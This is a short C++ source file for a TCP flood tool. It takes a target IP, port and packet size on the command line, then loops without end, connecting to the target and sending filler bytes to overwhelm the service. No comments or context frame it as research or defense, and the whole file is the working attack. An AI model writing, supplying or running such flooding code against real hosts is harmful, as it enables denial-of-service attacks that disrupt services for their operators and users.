#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <thread>

void tcpFlood(const char* targetIp, int targetPort, int packetSize) 
{
    char* buffer = new char[packetSize];
    memset(buffer, 'A', packetSize);

    while (true) 
    {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in targetAddr;
        targetAddr.sin_family = AF_INET;
        targetAddr.sin_port = htons(targetPort);
        inet_pton(AF_INET, targetIp, &targetAddr.sin_addr);

        connect(sock, (struct sockaddr*)&targetAddr, sizeof(targetAddr));
        send(sock, buffer, packetSize, 0);
        close(sock);
    }

    delete[] buffer;
}

int main(int argc, char* argv[]) 
{
    if (argc < 4) 
    {
        std::cerr << "Usage: " << argv[0] << " <target_ip> <target_port> <packet_size>" << std::endl;
        return 1;
    }

    const char* targetIp = argv[1];
    int targetPort = std::stoi(argv[2]);
    int packetSize = std::stoi(argv[3]);   
  
    std::thread tcpThread(tcpFlood, targetIp, targetPort, packetSize);
  
    tcpThread.join();
    return 0;
}
